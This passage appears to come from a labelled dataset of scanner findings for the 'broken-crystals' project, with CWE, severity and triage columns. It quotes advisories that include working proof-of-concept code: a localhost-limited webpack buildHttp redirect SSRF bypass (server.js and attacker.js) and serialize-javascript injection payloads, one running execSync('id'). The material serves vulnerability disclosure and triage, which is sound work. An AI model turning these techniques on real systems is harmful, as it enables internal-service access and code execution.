`Location` URL without re-checking whether the redirected URL is within `allowedUris`. Practical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs. **Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache. <img width=""1648"" height=""461"" alt=""image"" src=""https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524"" /> ### PoC This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely. #### 1) Setup ```bash mkdir split-ssrf-poc && cd split-ssrf-poc npm init -y npm i -D webpack webpack-cli ``` #### 2) Create server.js ```js #!/usr/bin/env node ""use strict""; const http = require(""http""); const url = require(""url""); const allowedPort = 9000; const internalPort = 9100; const internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`; const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`; const internalPayload = `export const secret = ${JSON.stringify(secret)};\n` + `export default ""ok"";\n`; function start(port, handler) { return new Promise(resolve => { const s = http.createServer(handler); s.listen(port, ""127.0.0.1"", () => resolve(s)); }); } (async () => { // Internal-only service (SSRF target) await start(internalPort, (req, res) => { if (req.url === ""/secret.js"") { res.statusCode = 200; res.setHeader(""Content-Type"", ""application/javascript; charset=utf-8""); res.end(internalPayload); console.log(`[internal] 200 /secret.js served (secret=${secret})`); return; } res.statusCode = 404; res.end(""not found""); }); // Allowed host (redirector) await start(allowedPort, (req, res) => { const parsed = url.parse(req.url, true); if (parsed.pathname === ""/redirect.js"") { const to = parsed.query.to || internalUrlDefault; // Safety guard: only allow redirecting to localhost internal service in this PoC if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) { res.statusCode = 400; res.end(""to must be internal-only in this PoC""); console.log(`[allowed] blocked redirect to: ${to}`); return; } res.statusCode = 302; res.setHeader(""Location"", to); res.end(""redirecting""); console.log(`[allowed] 302 /redirect.js -> ${to}`); return; } res.statusCode = 404; res.end(""not found""); }); console.log(`\nServer running:`); console.log(`- allowed host: http://127.0.0.1:${allowedPort}/redirect.js`); console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`); })(); ``` #### 3) Create attacker.js ```js #!/usr/bin/env node ""use strict""; const path = require(""path""); const os = require(""os""); const fs = require(""fs/promises""); const webpack = require(""webpack""); const webpackPkg = require(""webpack/package.json""); const allowedPort = 9000; const internalPort = 9100; const allowedBase = `http://127.0.0.1:${allowedPort}/`; const internalTarget = `http://127.0.0.1:${internalPort}/secret.js`; const entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`; async function walk(dir) { const out = []; const items = await fs.readdir(dir, { withFileTypes: true }); for (const it of items) { const p = path.join(dir, it.name); if (it.isDirectory()) out.push(...await walk(p)); else if (it.isFile()) out.push(p); } return out; } async function fileContains(f, needle) { try { const buf = await fs.readFile(f); return buf.toString(""utf8"").includes(needle) || buf.toString(""latin1"").includes(needle); } catch { return false; } } async function findInFiles(files, needle) { const hits = []; for (const f of files) if (await fileContains(f, needle)) hits.push(f); return hits; } const fmtBool = b => (b ? ""✅"" : ""❌""); (async () => { const tmp = await fs.mkdtemp(path.join(os.tmpdir(), ""webpack-attacker-"")); const srcDir = path.join(tmp, ""src""); const distDir = path.join(tmp, ""dist""); const cacheDir = path.join(tmp, "".buildHttp-cache""); const lockfile = path.join(tmp, ""webpack.lock""); const bundlePath = path.join(distDir, ""bundle.js""); await fs.mkdir(srcDir, { recursive: true }); await fs.mkdir(distDir, { recursive: true }); await fs.writeFile( path.join(srcDir, ""index.js""), `import { secret } from ${JSON.stringify(entryUrl)}; console.log(""LEAKED_SECRET:"", secret); export default secret; ` ); const config = { context: tmp, mode: ""development"", entry: ""./src/index.js"", output: { path: distDir, filename: ""bundle.js"" }, experiments: { buildHttp: { allowedUris: [allowedBase], cacheLocation: cacheDir, lockfileLocation: lockfile, upgrade: true } } }; const compiler = webpack(config); compiler.run(async (err, stats) => { try { if (err) throw err; const info = stats.toJson({ all: false, errors: true, warnings: true }); if (stats.hasErrors()) { console.error(info.errors); process.exitCode = 1; return; } const bundle = await fs.readFile(bundlePath, ""utf8""); const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i); const secret = m ? m[0] : null; console.log(""\n[ATTACKER RESULT]""); console.log(`- webpack version: ${webpackPkg.version}`); console.log(`- node version: ${process.version}`); console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`); console.log(`- imported URL (allowed only): ${entryUrl}`); console.log(`- temp dir: ${tmp}`); console.log(`- lockfile: ${lockfile}`); console.log(`- cacheDir: ${cacheDir}`); console.log(`- bundle: ${bundlePath}`); if (!secret) { console.log(""\n[SECURITY SUMMARY]""); console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`); return; } const lockHit = await fileContains(lockfile, secret); let cacheFiles = []; try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; } const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false; const allTmpFiles = await walk(tmp); const allHits = await findInFiles(allTmpFiles, secret); console.log(`\n- extracted secret marker from bundle: ${secret}`); console.log(""\n[SECURITY SUMMARY]""); console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`); console.log(`- Internal target (SSRF-like): ${internalTarget}`); console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`); console.log(`- ACTUAL: internal content treated as module and bundled`); console.log(""\n[EVIDENCE CHECKLIST]""); console.log(`- bundle contains secret: ${fmtBool(true)}`); console.log(`- cache contains secret: ${fmtBool(cacheHit)}`); console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`); console.log(""\n[PERSISTENCE CHECK] files containing secret""); for (const f of allHits.slice(0, 30)) console.log(`- ${f}`); if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`); } catch (e) { console.error(e); process.exitCode = 1; } finally { compiler.close(() => {}); } }); })(); ``` #### 4) Run Terminal A: ```bash node server.js ``` Terminal B: ```bash node attacker.js ``` #### 5) Expected Expected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed). ### Impact Vulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled). Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can: trigger network requests from the build machine to internal-only services (SSRF behavior), cause content from outside the allow-list to be bundled into build outputs, and cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",TP,medium,yes,1
GRP-broken-crystals-CWE-918-926,trivy,broken-crystals,CWE-918,high,axios@0.21.4,axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests,TP,medium,yes,1
GRP-broken-crystals-CWE-918-927,trivy,broken-crystals,CWE-918,high,axios@0.26.1,axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests,TP,medium,yes,1
GRP-broken-crystals-CWE-918-928,trivy,broken-crystals,CWE-918,high,ip@1.1.5,node-ip: Incomplete fix for CVE-2023-42282,TP,medium,yes,1
GRP-broken-crystals-CWE-918-929,trivy,broken-crystals,CWE-918,high,ip@2.0.0,node-ip: Incomplete fix for CVE-2023-42282,TP,medium,yes,1
GRP-broken-crystals-CWE-918-930,trivy,broken-crystals,CWE-918,medium,request@2.88.2,request: bypass of SSRF mitigations when following a cross-protocol redirect,TP,medium,yes,1
GRP-broken-crystals-CWE-920-931,trivy,broken-crystals,CWE-920,medium,linux-libc-dev@4.19.269-1,kernel: wifi: mac80211: don&#39;t return unset power in ieee80211_get_tx_power(),pending,low,no,1
GRP-broken-crystals-CWE-94-932,npm-audit,broken-crystals,CWE-94,info,@nestjs/common,nest allows a remote attacker to execute arbitrary code via the Content-Type header,TP,medium,yes,1
GRP-broken-crystals-CWE-94-933,dep-check,broken-crystals,CWE-94,info,@nestjs/common:10.4.7,File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.,TP,medium,yes,1
GRP-broken-crystals-CWE-94-934,trivy,broken-crystals,CWE-94,medium,@nestjs/common@9.3.9,nest allows a remote attacker to execute arbitrary code via the Content-Type header,TP,medium,yes,1
GRP-broken-crystals-CWE-96-935,npm-audit,broken-crystals,CWE-96,high,serialize-javascript,Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString(),pending,low,no,1
GRP-broken-crystals-CWE-96-936,dep-check,broken-crystals,CWE-96,high,serialize-javascript:6.0.2,"### Impact The serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660. While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`. If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes. ``` javascript const serialize = require('serialize-javascript'); // Create an object that passes instanceof RegExp with a spoofed .flags const fakeRegex = Object.create(RegExp.prototype); Object.defineProperty(fakeRegex, 'source', { get: () => 'x' }); Object.defineProperty(fakeRegex, 'flags', { get: () => '""+(global.PWNED=""CODE_INJECTION_VIA_FLAGS"")+""' }); fakeRegex.toJSON = function() { return '@placeholder'; }; const output = serialize({ re: fakeRegex }); // Output: {""re"":new RegExp(""x"", """"+(global.PWNED=""CODE_INJECTION_VIA_FLAGS"")+"""")} let obj; eval('obj = ' + output); console.log(global.PWNED); // ""CODE_INJECTION_VIA_FLAGS"" — injected code executed! #h2. PoC 2: Code Injection via Date.toISOString() ``` ``` javascript const serialize = require('serialize-javascript'); const fakeDate = Object.create(Date.prototype); fakeDate.toISOString = function() { return '""+(global.DATE_PWNED=""DATE_INJECTION"")+""'; }; fakeDate.toJSON = function() { return '2024-01-01'; }; const output = serialize({ d: fakeDate }); // Output: {""d"":new Date(""""+(global.DATE_PWNED=""DATE_INJECTION"")+"""")} eval('obj = ' + output); console.log(global.DATE_PWNED); // ""DATE_INJECTION"" — injected code executed! #h2. PoC 3: Remote Code Execution ``` ``` javascript const serialize = require('serialize-javascript'); const rceRegex = Object.create(RegExp.prototype); Object.defineProperty(rceRegex, 'source', { get: () => 'x' }); Object.defineProperty(rceRegex, 'flags', { get: () => '""+require(""child_process"").execSync(""id"").toString()+""' }); rceRegex.toJSON = function() { return '@rce'; }; const output = serialize({ re: rceRegex }); // Output: {""re"":new RegExp(""x"", """"+require(""child_process"").execSync(""id"").toString()+"""")} // When eval'd on a Node.js server, executes the ""id"" system command ``` ### Patches The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",pending,low,no,1
GRP-broken-crystals-CWE-CWE-200-937,nuclei,broken-crystals,CWE-CWE-200,info,http://localhost:3001/swagger/index.html,Public Swagger API - Detect,pending,low,no,1
GRP-broken-crystals-CWE-CWE-200-938,nuclei,broken-crystals,CWE-CWE-200,info,localhost,CAA Record,pending,low,no,1
GRP-broken-crystals-CWE-CWE-693-939,nuclei,broken-crystals,CWE-CWE-693,info,http://localhost:3001,Missing Cookie SameSite Strict,pending,low,no,1
